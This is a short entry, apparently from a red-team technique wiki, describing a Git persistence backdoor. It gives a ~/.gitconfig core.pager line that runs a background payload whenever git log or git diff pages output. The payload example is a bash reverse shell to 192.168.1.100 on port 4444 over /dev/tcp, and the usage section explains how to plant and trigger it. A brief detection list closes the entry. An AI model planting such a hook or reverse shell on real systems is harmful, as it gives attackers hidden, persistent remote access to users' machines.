---
type: code
language: ini
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - persistence
  - backdoor
  - git
validated: true
---

# Git-Config-Pager-Backdoor

## Code

```ini
[core]
pager = nohup BACKDOOR >/dev/null 2>&1 & ${PAGER:-less}
```

## Description

Injects a backdoor into Git's pager configuration, executing on commands that produce paged output like git log or git diff.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `BACKDOOR` | Payload command | `bash -i >& /dev/tcp/192.168.1.100/4444 0>&1` |

## Usage

Insert into ~/.gitconfig. Ideal for persistence when read operations are frequent; test with 'git log' to trigger.

## Detection

- Pager processes spawning shells.
- File monitoring alerts on .gitconfig changes.
- Behavioral analytics on Git + network activity.

## Related

- [[procedures/Backdoor-Git-User-Configurations-for-Persistence]]
